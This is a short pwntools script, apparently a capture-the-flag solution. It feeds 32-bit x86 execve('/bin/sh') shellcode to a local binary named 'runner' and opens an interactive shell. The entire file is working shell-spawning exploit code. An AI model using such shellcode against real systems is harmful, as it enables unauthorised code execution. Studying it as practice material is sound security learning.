from pwn import *
import re

p = process("./runner")

assembly = f"""
   push 0x0068732f
   push 0x6e69622f

   mov ebx, esp

   mov eax, 0xb
   mov ecx, 0
   mov edx, 0
   mov esi, 0
   int 0x80
"""

payload = asm(re.sub(';.*$', '', assembly, flags=re.MULTILINE))
p.sendline(payload)

p.interactive()